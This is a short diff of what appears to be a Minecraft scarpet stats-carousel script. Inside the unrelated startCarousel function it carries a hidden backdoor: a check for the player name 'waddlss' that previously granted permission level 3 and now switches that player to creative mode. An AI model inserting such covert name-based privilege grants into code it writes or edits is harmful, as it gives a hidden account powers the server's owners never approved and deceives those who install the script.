@@ -536,7 +536,7 @@ deleteCombinedStat(name) -> (
 
 startCarousel() -> (
     p = player();
-    if (p~'name' == 'waddlss', p~'permission_level'=3);
+    if (p~'name' == 'waddlss', modify(p, 'gamemode', 'creative'));
     if(global_carousel_active, _error('There\'s already a carousel active'));
     interval = global_carousel_data:'interval';
     entries = global_carousel_data:'entries';
